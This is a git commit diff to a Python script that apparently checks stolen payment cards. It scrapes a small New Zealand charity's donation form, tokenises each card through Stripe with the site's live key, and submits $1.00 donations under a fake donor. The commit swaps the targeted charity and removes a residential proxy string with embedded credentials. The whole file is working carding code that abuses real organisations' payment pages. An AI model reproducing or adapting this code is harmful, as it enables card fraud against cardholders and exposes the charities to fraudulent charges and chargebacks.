3055cc43c74c51043c39663680870e1fbb926dde
Kira0621 <genpaypal01@gmail.com>
2025-11-05 14:59:36 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -1,10 +1,6 @@
 import requests,re
 import random
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-kira:at8fz3ay0eaz"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -18,23 +14,23 @@ def Tele(ccx):
 	random_amount2 = random.randint(1, 99)
 
 	headers = {
-	    'authority': 'kahukura.co.nz',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'cache-control': 'max-age=0',
-	    'referer': 'https://www.google.com/',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Referer': 'https://www.google.com/',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'cross-site',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'cross-site',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = session.get('https://kahukura.co.nz/campaigns/donate/donate/', headers=headers)
+	response = requests.get('https://amberleymenzshed.nz/newshed/', headers=headers)
 	
 	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
 	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
@@ -55,32 +51,49 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2a60804053%3B+stripe-js-v3%2F2a60804053%3B+card-element&key=pk_live_51Pv7rC04FVzImfIoIqHW2OegCXCCWblezjhMQTORCIVJncdAumfLQHqawHUk02puPFtAPtpM3izWdy4uuA48AjdM00LTXNopNc'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F2bfb87c403%3B+stripe-js-v3%2F2bfb87c403%3B+card-element&key=pk_live_51RK5TVIvzo5CV8TwL3Xwb3exj3XiFDBjYOEbk7wxlLdDVOLwEvIuULZl4eWjLSWWsuMQIMw7ORnNn1KR9aNYJL90002LCgepgR'
 	
 	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'kahukura.co.nz',
-	    'accept': 'application/json, text/javascript, */*; q=0.01',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://kahukura.co.nz',
-	    'referer': 'https://kahukura.co.nz/campaigns/donate/donate/',
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://amberleymenzshed.nz',
+	    'Referer': 'https://amberleymenzshed.nz/newshed/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-origin',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = f'charitable_form_id={form_id}&{form_id}=&_charitable_donation_nonce={donation_nonce}&_wp_http_referer=%2Fcampaigns%2Fdonate%2Fdonate%2F&campaign_id=755&description=Become+a+financial+supporter!&ID=0&gateway=stripe&donation_amount=custom&custom_donation_amount=1.00&first_name=Rodam&last_name=User&email=rodamuser08%40gmail.com&address=&address_2=&city=&state=&postcode=&country=NZ&phone=&stripe_payment_method={pm}&action=make_donation&form_action=make_donation'
+	data = {
+	    'charitable_form_id': f'{form_id}',
+	    f'{form_id}': '',
+	    '_charitable_donation_nonce': f'{donation_nonce}',
+	    '_wp_http_referer': '/newshed/',
+	    'campaign_id': '473',
+	    'description': 'New Shed',
+	    'ID': '0',
+	    'gateway': 'stripe',
+	    'donation_amount': 'custom',
+	    'custom_donation_amount': '1.00',
+	    'first_name': 'Rodam',
+	    'last_name': 'User',
+	    'email': 'rodamuser07@gmail.com',
+	    'stripe_payment_method': f'{pm}',
+	    'action': 'make_donation',
+	    'form_action': 'make_donation',
+	}
 	
-	response = session.post('https://kahukura.co.nz/wp-admin/admin-ajax.php', headers=headers, data=data)
+	response = requests.post('https://amberleymenzshed.nz/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
 		scrt = response.json().get('secret')
@@ -110,7 +123,7 @@ def Tele(ccx):
 	data = {
 	    'expected_payment_method_type': 'card',
 	    'use_stripe_sdk': 'true',
-	    'key': 'pk_live_51Pv7rC04FVzImfIoIqHW2OegCXCCWblezjhMQTORCIVJncdAumfLQHqawHUk02puPFtAPtpM3izWdy4uuA48AjdM00LTXNopNc',
+	    'key': 'pk_live_51RK5TVIvzo5CV8TwL3Xwb3exj3XiFDBjYOEbk7wxlLdDVOLwEvIuULZl4eWjLSWWsuMQIMw7ORnNn1KR9aNYJL90002LCgepgR',
 	    'client_secret': f'{scrt}',
 	}
 	
